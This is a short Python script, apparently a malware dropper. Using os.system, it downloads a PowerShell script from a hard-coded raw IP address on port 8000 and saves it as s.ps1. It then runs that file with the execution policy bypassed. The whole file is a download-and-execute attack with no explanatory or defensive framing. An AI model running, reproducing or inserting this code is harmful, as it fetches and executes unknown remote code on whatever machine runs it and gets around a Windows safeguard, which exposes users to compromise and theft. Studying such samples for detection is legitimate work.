import os
os.system('curl -s -o s.ps1 http://13.125.103.41:8000/download?f=powershell')
os.system('powershell.exe -ExecutionPolicy Bypass -File s.ps1')